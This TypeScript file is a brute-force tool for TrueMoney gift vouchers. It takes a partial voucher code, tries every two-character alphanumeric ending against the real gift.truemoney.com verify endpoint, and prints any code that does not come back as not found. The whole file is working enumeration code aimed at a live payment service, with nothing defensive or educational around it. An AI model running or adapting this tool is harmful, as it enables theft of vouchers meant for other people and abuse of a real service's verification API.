import needle from 'needle';
const IGNORING_CASES:Array<string> = ['VOUCHER_NOT_FOUND','INTERNAL_ERROR'];

const POSSIBLE_ALPHABETS = [
    'a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z',
    '1','2','3','4','5','6','7','8','9','0',
    'A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z'
];

const LINK = {
    CAMPAIGN_PREFIX: 'https://gift.truemoney.com/campaign/?v=',
    GENERATE_TRIAL_VERIFY_LINK: (midfix:string) => `https://gift.truemoney.com/campaign/vouchers/${midfix}/verify`
};
const RUN = (TARGET_MISSING_CODE:string):void => {
    //if(!process.argv[2]) return console.log('[USAGE]: twinties.ts eCccjeab61o3Nngd')
    //const TARGET_MISSING_CODE:string = process.argv[2] // should be the one with missing last alphabet
    console.time('pair_perf');
    for(let alphabet of POSSIBLE_ALPHABETS){
        for(let pair_alphabet of POSSIBLE_ALPHABETS){
            const paired_alphabet = pair_alphabet+alphabet
            needle.get(LINK.GENERATE_TRIAL_VERIFY_LINK(TARGET_MISSING_CODE+paired_alphabet), function(error, response) {
            if(IGNORING_CASES.indexOf(response.body.status.code) === -1){
                return console.log(`actual_code: ${TARGET_MISSING_CODE+paired_alphabet}\nfull_link: ${LINK.CAMPAIGN_PREFIX}${TARGET_MISSING_CODE+paired_alphabet}`) // in ur console -> see magic ^_^
            }
        });
        }
    }
    console.timeEnd('pair_perf');

}

export default RUN